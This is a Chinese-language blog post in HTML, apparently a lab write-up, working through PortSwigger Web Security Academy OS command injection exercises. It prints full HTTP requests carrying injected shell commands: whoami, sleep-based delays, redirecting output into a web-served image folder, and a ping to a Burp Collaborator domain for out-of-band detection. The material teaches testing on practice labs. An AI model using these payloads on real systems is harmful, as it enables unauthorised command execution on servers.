@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的系统命令注入（OS Command Injectio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy 命令注入">
+<meta property="og:url" content="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的系统命令注入（OS Command Injectio">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-collaborator.png">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-collaborator-dns-log.png">
+<meta property="article:published_time" content="2025-01-02T14:44:38.362Z">
+<meta property="article:modified_time" content="2025-01-02T14:43:33.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Burp">
+<meta property="article:tag" content="Command Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://secdroid.github.io/images/burp-collaborator.png">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/","path":"2025/01/02/burp-web-academy-os-command-injection/","title":"Burp Web Academy 命令注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy 命令注入 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">0x02. 命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-OS-command-injection-simple-case"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: OS command injection, simple case</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Blind-OS-command-injection-with-time-delays"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Blind OS command injection with time delays</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Blind-OS-command-injection-with-output-redirection"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Blind OS command injection with output redirection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Blind-OS-command-injection-with-out-of-band-interaction"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Blind OS command injection with out-of-band interaction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Blind-OS-command-injection-with-out-of-band-data-exfiltration"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Blind OS command injection with out-of-band data exfiltration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy 命令注入 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy 命令注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-01-02 22:44:38 / 修改时间：22:43:33" itemprop="dateCreated datePublished" datetime="2025-01-02T22:44:38+08:00">2025-01-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 Web Security Academy 之中的系统命令注入（OS Command Injection）章节。</p>
+<span id="more"></span>
+
+<h2 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02. 命令注入"></a>0x02. 命令注入</h2><h3 id="2-1-Lab-OS-command-injection-simple-case"><a href="#2-1-Lab-OS-command-injection-simple-case" class="headerlink" title="2.1 Lab: OS command injection, simple case"></a>2.1 Lab: OS command injection, simple case</h3><blockquote>
+<p>This lab contains an OS command injection vulnerability in the product stock checker.</p>
+<p>The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.</p>
+<p>To solve the lab, execute the <code>whoami</code> command to determine the name of the current user.</p>
+</blockquote>
+<p>访问 URL <code>https://0a46004a04ca1df9817fdf8200f300f2.web-security-academy.net/product?productId=14</code>，最下面有一个 <code>Check stock</code> 按钮，点击后在 Burp Suite 中可以看到 POST 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a46004a04ca1df9817fdf8200f300f2.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=vXIadQwAPKmbmZxQ4EIJ9iSZhSVLaQGW</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;127&quot;, &quot;Not)A;Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a46004a04ca1df9817fdf8200f300f2.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a46004a04ca1df9817fdf8200f300f2.web-security-academy.net/product?productId=14</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">productId</span>=<span class="number">14</span>&amp;storeId=<span class="number">1</span></span></span><br></pre></td></tr></table></figure>
+
+<p>尝试通过反引号注入，发现不行；再尝试分号 <code>productId=1&amp;storeId=2;whoami</code>，成功执行注入的命令。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">22</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">peter</span>-<span class="number">8</span>oOYgZ</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-Blind-OS-command-injection-with-time-delays"><a href="#2-2-Lab-Blind-OS-command-injection-with-time-delays" class="headerlink" title="2.2 Lab: Blind OS command injection with time delays"></a>2.2 Lab: Blind OS command injection with time delays</h3><blockquote>
+<p>This lab contains a blind OS command injection vulnerability in the feedback function.</p>
+<p>The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.</p>
+<p>To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.</p>
+</blockquote>
+<p>问问 Copilot 什么是盲注（<strong>中文回答还差点意思</strong>）：</p>
+<blockquote>
+<p><strong>Question</strong>: What’s the meaning of <code>blind injection</code> in Web Security?</p>
+<p><strong>Answer</strong>: In Web Security, “blind injection,” or more specifically, “blind SQL injection,” is a type of SQL injection attack where an attacker sends queries to the database and infers the results based on the behavior of the web application, rather than seeing the data directly.</p>
+<p>For example, an attacker might send a query designed to return a true or false result and then observe how the web page responds. If the page’s response changes, the attacker knows that the query affected the database, even though they can’t see the data directly.</p>
+<p>This method can be more time-consuming than other types of SQL injection because it requires careful observation and crafting of queries, but it’s still a powerful technique for extracting sensitive information from databases.</p>
+<p>If you’re interested in learning more about how to defend against such attacks, I can provide some tips or resources. Just let me know!</p>
+</blockquote>
+<p>根据题目的提示，发现右上角有一个 <code>Submit feedback</code>，尝试进行注入测试：</p>
+<ul>
+<li>注入点在 <code>email</code> 字段</li>
+<li>通过 <code>sleep 10</code> 来实现延时<ul>
+<li>注入命令前后都需要有注入字符，比如 <code>;sleep%2010;</code> 或者 <code>||sleep%2010||</code></li>
+<li>官方答案使用 <code>ping</code> 来延时（<code>;ping+-c+10+127.0.0.1;</code>）<ul>
+<li>注意，在 URL 编码中，空格 <code> </code> 不仅可以使用 <code>%20</code> 编码，还可以使用 <code>+</code> 编码</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/feedback/submit</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ada000a04235099835f5fb6007600c8.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KCki6D8u9Sy6u5Vvpn2xzlzoInIThtKF</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;127&quot;, &quot;Not)A;Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0ada000a04235099835f5fb6007600c8.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0ada000a04235099835f5fb6007600c8.web-security-academy.net/feedback</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=aubYsYL43kPMCm2FyEuBeWNbAKGudIEW&amp;name=<span class="number">1</span>&amp;email=<span class="number">2</span>%<span class="number">40</span>gmail.com||sleep%<span class="number">2010</span>||&amp;subject=<span class="number">2</span>&amp;message=<span class="number">3</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-Blind-OS-command-injection-with-output-redirection"><a href="#2-3-Lab-Blind-OS-command-injection-with-output-redirection" class="headerlink" title="2.3 Lab: Blind OS command injection with output redirection"></a>2.3 Lab: Blind OS command injection with output redirection</h3><blockquote>
+<p>This lab contains a blind OS command injection vulnerability in the feedback function.</p>
+<p>The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/images/</span><br></pre></td></tr></table></figure>
+
+<p>The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.</p>
+<p>To solve the lab, execute the <code>whoami</code> command and retrieve the output.</p>
+</blockquote>
+<p>在前一题的基础上，这个题就很简单了：将命令执行的结果写入 <code>/var/www/images/</code>，然后通过 URL 来查看文件内容。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/feedback/submit</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a4400c9044f1daf8136fddf00da0017.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=9mWga6JAGpv2oYMEFc88AQQucaKnWabL</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>117</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;127&quot;, &quot;Not)A;Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a4400c9044f1daf8136fddf00da0017.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a4400c9044f1daf8136fddf00da0017.web-security-academy.net/feedback</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">csrf</span><span class="operator">=</span>woqXf8DV6FUWJtWTZA3KZJfMtcX5wjBU<span class="variable">&amp;name</span>=<span class="number">1</span><span class="variable">&amp;email</span>=<span class="number">2</span>%<span class="number">40</span>gmail.<span class="attr">com</span><span class="punctuation">;</span>whoami&gt;<span class="keyword">/var/</span>www<span class="keyword">/images/</span>flag.<span class="attr">txt</span><span class="punctuation">;</span><span class="variable">&amp;subject</span>=<span class="number">3</span><span class="variable">&amp;message</span>=<span class="number">4</span></span></span><br></pre></td></tr></table></figure>
+
+<p>然后通过图片 URL 访问即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a4400c9044f1daf8136fddf00da0017.web-security-academy.net/image?filename=flag.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-Lab-Blind-OS-command-injection-with-out-of-band-interaction"><a href="#2-4-Lab-Blind-OS-command-injection-with-out-of-band-interaction" class="headerlink" title="2.4 Lab: Blind OS command injection with out-of-band interaction"></a>2.4 Lab: Blind OS command injection with out-of-band interaction</h3><blockquote>
+<p>This lab contains a blind OS command injection vulnerability in the feedback function.</p>
+<p>The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.</p>
+<p>To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.</p>
+</blockquote>
+<p>仍然是盲注，但是这次是异步执行命令，所以通过延时就无法感知命令注入是否成功了，这里通过发起 DNS 查询来感知命令注入的结果。</p>
+<p>看 Burp Collaborator 的介绍，似乎 Burp Suite Community 没有这个功能，有点遗憾，那么就临时用一下 <a href="https://secdroid.github.io/2025/01/01/burp-suite-pro/">Burp Suite Pro</a> 吧 :-D</p>
+<p><img src="/images/burp-collaborator.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/feedback/submit</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a340036035ad56781a5170c00c3001e.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=rpcnlZoYzqHXOMNFaBDPAXRhzfQyjMU4</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>140</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a340036035ad56781a5170c00c3001e.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a340036035ad56781a5170c00c3001e.web-security-academy.net/feedback</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=n8QHyGJzWxs0jAJKlHTQC3wr23wNlze9&amp;name=<span class="number">1</span>&amp;email=<span class="number">2</span>%<span class="number">40</span>gmail.com;ping+-c+<span class="number">4</span>+vwvk7vf1wdbva4fzqi26fvxkvb12psdh.oastify.com;&amp;subject=<span class="number">3</span>&amp;message=<span class="number">4</span></span></span><br></pre></td></tr></table></figure>
+
+<p>操作步骤：</p>
+<ol>
+<li>进入 Burp Suite Pro，点击 Collaborator，生成一个域名</li>
+<li>在 HTTP POST 请求中，通过注入 <code>ping</code> 域名</li>
+<li>回到 Burp 中的 Collaborator，可以看到已经触发了 DNS 解析，如果暂时没看到，可以点击 <code>Poll now</code> 按钮刷新</li>
+</ol>
